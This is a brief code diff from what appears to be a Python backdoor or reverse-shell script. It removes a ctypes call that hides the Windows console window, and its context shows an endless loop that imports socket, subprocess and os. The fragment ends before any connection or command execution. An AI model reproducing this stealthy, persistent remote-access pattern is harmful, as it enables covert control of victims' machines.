@@ -1,5 +1,3 @@
-import ctypes
-ctypes.windll.user32.ShowWindow( ctypes.windll.kernel32.GetConsoleWindow(), 0 )
 while True:
     try:
         import socket as s,subprocess as sp,os
